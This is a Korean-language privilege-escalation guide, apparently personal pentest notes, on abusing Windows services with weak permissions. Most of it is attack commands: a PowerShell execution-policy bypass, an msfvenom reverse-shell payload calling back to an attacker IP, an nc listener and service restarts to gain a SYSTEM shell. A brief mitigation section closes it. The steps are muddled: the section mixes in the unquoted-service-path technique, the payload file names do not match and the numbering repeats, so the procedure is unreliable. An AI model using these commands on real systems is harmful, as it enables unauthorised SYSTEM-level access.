

# 취약한 서비스 권한 (Insecure Service Permissions) 공격 가이드

Windows 서비스에 부적절한 권한이 설정되어 있을 경우, 일반 사용자가 서비스 설정을 변경하여 권한을 상승시킬 수 있습니다. 특히 서비스의 실행 파일 경로를 변경할 수 있는 권한이 있다면, 이를 악용하여 `NT AUTHORITY\SYSTEM` 권한을 획득할 수 있습니다.

### **취약점 원리**

만약 특정 그룹(예: `Authenticated Users`)이나 일반 사용자에게 서비스의 설정을 변경할 수 있는 `SERVICE_CHANGE_CONFIG` 권한이 부여되어 있다면, 공격자는 해당 서비스가 실행할 파일의 경로(`binPath`)를 자신이 업로드한 악성 파일로 변경할 수 있습니다. 이후 서비스를 재시작하면, 해당 서비스가 가진 높은 권한(주로 `LocalSystem`)으로 악성 파일이 실행됩니다.

---


### **1. 취약점 식별**

- **목표:** 현재 사용자가 수정할 수 있는 권한을 가진 서비스를 찾습니다.
- **핵심 도구:** `accesschk.exe` (Sysinternals), `PowerUp.ps1`

```powershell(title="accesschk - 모든 서비스에 대한 현재 사용자 권한 확인")
# -w: 쓰기 권한이 있는 것만 표시
# -c: 서비스 이름
# -v: 상세 정보
# <user_or_group>: 'Authenticated Users' 또는 현재 사용자 이름
accesschk.exe -wcv "Authenticated Users" *

accesschk64.exe /accepteula -uwqvc daclsvc
```

![[Pasted image 20250707230538.png]]

> `PowerUp.ps1`의 `Invoke-AllChecks` 함수는 이 과정을 자동화하여 취약한 서비스를 바로 찾아주므로 매우 효율적입니다.

---

### **2. 권한 분석**

- **목표:** `accesschk`의 결과에서 공격에 필요한 특정 권한이 있는지 확인합니다.
- **필수 권한:**
  - `SERVICE_CHANGE_CONFIG`: 서비스의 실행 파일 경로 등 설정을 변경할 수 있는 가장 핵심적인 권한입니다.
- **유용한 권한:**
  - `SERVICE_START`, `SERVICE_STOP`: 서비스를 직접 재시작할 수 있어 공격을 즉시 트리거할 수 있습니다.
  - `SERVICE_ALL_ACCESS`: 모든 권한을 의미합니다.

---

### **3. 익스플로잇 (Exploitation)**

1. **Powershell 실행:**
    - PowerShell을 시작할 때 실행 정책(Execution Policy)을 일시적으로 우회함.
    - PowerShell의 보안 설정을 변경하여 스크립트 파일(.ps1 등)을 실행할 수 있게 해줍니다.
    ```bash title="powershell 실행 정책 우회"
powershell -ep bypass
    ```

2. **서비스 권한 체크:**
    - https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
    - ![[service-acl 1.ps1]]
    ```bash title="서비스 권한체크"
. ./service-acl.ps1
"zerotieroneservice" | Get-ServiceAcl | select -ExpandProperty Access
    ```

3. **리버스 셸 페이로드 생성 및 업로드:**
    - `msfvenom`으로 `exe` 형식의 리버스 셸 페이로드를 생성하여, 타겟 시스템의 쓰기 가능한 폴더(예: `C:\Windows\tasks`)에 업로드합니다.
    ```bash title="공격자 Kali : msfvenom 페이로드 생성"
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f exe -o revshell.exe
    ```

4.  **서비스 실행 경로 내 파일 변경:**
    - 실행 파일을 따옴표로 묶지 않은 경로의 쓰기 가능한 폴더에 넣으세요. Windows는 따옴표로 묶지 않은 컨텍스트에서 데이터 구문 분석을 처리하는 방식 때문에 원래 실행 파일보다 먼저 실행 파일을 읽습니다.
    ```powershell title="타겟 : 서비스 경로 내 파일 변경"
copy "C:\users\user\jaja\reverse.exe" "C:\Program Files\Unquoted Path Service\Common.exe"
    ```

5.  **리스너 실행:**
    - 공격자 머신에서 Netcat 리스너를 실행합니다.
    ```bash title="공격자 Kali : Netcat 리스너"
rlwrap nc -lvnp 443
    ```

4.  **서비스 재시작:**
    - 서비스를 재시작하여 변경된 서비스의 페이로드가 실행되도록 합니다.
    ```powershell title="타겟 : 서비스 재시작"
sc.exe query unquotedsvc
sc stop <vulnerable_service_name>
sc start <vulnerable_service_name>
    ```
    > 만약 서비스 제어 권한이 없다면, 시스템이 재부팅될 때까지 기다려야 할 수도 있습니다.

5.  **권한 상승 성공:**
    - 서비스가 시작되면서 `revshell.exe`가 `SYSTEM` 권한으로 실행되고, 공격자에게 최상위 권한의 셸이 연결됩니다.

---


### **4. 방어 (Mitigation)**

- **최소 권한의 원칙:** 일반 사용자가 서비스 설정을 변경할 수 없도록 권한을 엄격하게 관리합니다.
- **정기적인 감사:** `accesschk`와 같은 도구를 사용하여 시스템의 서비스 권한 설정을 주기적으로 검토하고 불필요한 권한을 제거합니다.
